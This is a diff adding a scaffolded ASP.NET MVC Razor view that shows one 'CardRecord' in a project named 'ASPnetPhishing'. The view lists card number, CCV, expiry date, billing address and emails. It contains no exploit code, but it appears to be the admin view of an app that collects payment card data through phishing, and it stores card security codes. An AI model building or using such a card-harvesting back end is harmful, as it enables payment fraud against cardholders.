@@ -1,0 +1,91 @@
+﻿@model ASPnetPhishing.Models.CardRecord
+
+@{
+    ViewBag.Title = "Details";
+    Layout = "~/Views/Shared/_Layout.cshtml";
+}
+
+<h2>Details</h2>
+
+<div>
+    <h4>CardRecord</h4>
+    <hr />
+    <dl class="dl-horizontal">
+        <dt>
+            @Html.DisplayNameFor(model => model.CardNumber)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.CardNumber)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.CCV)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.CCV)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.ExpDate)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.ExpDate)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.BillingAddress)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.BillingAddress)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.BillingCity)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.BillingCity)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.BillingState)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.BillingState)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.BillingZip)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.BillingZip)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.BillingEmail)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.BillingEmail)
+        </dd>
+
+        <dt>
+            @Html.DisplayNameFor(model => model.AspNetUser.Email)
+        </dt>
+
+        <dd>
+            @Html.DisplayFor(model => model.AspNetUser.Email)
+        </dd>
+
+    </dl>
+</div>
+<p>
+    @Html.ActionLink("Edit", "Edit", new { id = Model.Id }) |
+    @Html.ActionLink("Back to List", "Index")
+</p>
